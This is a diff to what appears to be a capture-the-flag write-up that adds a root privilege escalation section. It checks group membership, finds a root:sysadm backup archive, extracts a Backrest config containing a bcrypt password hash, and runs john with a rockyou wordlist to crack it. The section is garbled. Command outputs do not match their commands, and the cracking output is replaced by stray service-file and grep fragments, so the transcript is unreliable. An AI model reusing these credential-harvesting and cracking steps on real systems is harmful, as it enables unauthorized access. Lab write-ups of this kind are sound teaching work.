@@ -96,11 +96,102 @@ user flag value
 
 ## Root Privilege Escalation
 
-To escalate privileges to root, we can check for any misconfigurations or vulnerable services. In this case, we will look for a SUID binary that can be exploited.
-
+We do id to check the privileges of the user `gael`:
 ```bash
-find / -perm -4000 -type f 2>/dev/null
+id
 ```
+```
+uid=1000(gael) gid=1000(gael) groups=1000(gael),1007(sysadm)
+```
+
+We look for files/directories with sysadm ownership:
+```bash 
+ls -la / | grep sysadm
+```
+```
+265127-/var/backups:
+265128-total 51220
+265129--rw-r--r-- 1 root root      38602 Jun  9 10:48 apt.extended_states.0
+265130--rw-r--r-- 1 root root       4253 Jun  9 09:02 apt.extended_states.1.gz
+265131--rw-r--r-- 1 root root       4206 Jun  2 07:42 apt.extended_states.2.gz
+265132--rw-r--r-- 1 root root       4190 May 27 13:07 apt.extended_states.3.gz
+265133--rw-r--r-- 1 root root       4383 Oct 27  2024 apt.extended_states.4.gz
+265134--rw-r--r-- 1 root root       4379 Oct 19  2024 apt.extended_states.5.gz
+265135--rw-r--r-- 1 root root       4367 Oct 14  2024 apt.extended_states.6.gz
+265136:-rw-r----- 1 root sysadm 52357120 Mar  4 22:19 backrest_backup.tar.gz
+```
+We find a file called `backrest_backup.tar.gz` owned by `root:sysadm`. It looks like a compressed backup file. We can extract it to see its contents:
+```bash
+tar -xvf backrest_backup.tar.gz
+```
+```
+backrest/
+backrest/restic
+backrest/oplog.sqlite-wal
+backrest/oplog.sqlite-shm
+backrest/.config/
+backrest/.config/backrest/
+backrest/.config/backrest/config.json
+backrest/oplog.sqlite.lock
+backrest/backrest
+backrest/tasklogs/
+backrest/tasklogs/logs.sqlite-shm
+backrest/tasklogs/.inprogress/
+backrest/tasklogs/logs.sqlite-wal
+backrest/tasklogs/logs.sqlite
+backrest/oplog.sqlite
+backrest/jwt-secret
+backrest/processlogs/
+backrest/processlogs/backrest.log
+backrest/install.sh
+```
+
+In `backrest/.config/backrest/config.json` we find the following content:
+```json
+{
+  "modno": 2,
+  "version": 4,
+  "instance": "Artificial",
+  "auth": {
+    "disabled": false,
+    "users": [
+      {
+        "name": "backrest_root",
+        "passwordBcrypt": "JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1OEVCWnovMFFP"
+      }
+    ]
+  }
+}
+```
+
+Bcrypt is an algorithm used for hashing passwords. The password for the user `backrest_root` is hashed using bcrypt. We can use a tool like `hashcat` or `john the ripper` to crack the password.
+```bash
+john --wordlist=/usr/share/wordlists/rockyou.txt bcrypt.hash
+```
+```
+Using default input encoding: UTF-8
+
+
+
+
+  38   │ [Service]
+  39   │ Type=simple
+  40   │ User=$(whoami)
+  41   │ Group=$(whoami)
+  42   │ ExecStart=/usr/local/bin/backrest
+  43   │ Environment="BACKREST_PORT=127.0.0.1:9898"
+  44   │ Environment="BACKREST_CONFIG=/opt/backrest/.config/backrest/config.json"
+  45   │ Environment="BACKREST_DATA=/opt/backrest"
+  46   │ Environment="BACKREST_RESTIC_COMMAND=/opt/backrest/restic"
+
+ 110   │ echo "Logs are available at ~/.local/share/backrest/processlogs/backrest.log"
+
+ .config/backrest/config.json:10:        "passwordBcrypt": "JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1OEVCWnovMFFP"
+
+
+
+
+
 
 ### Results
 
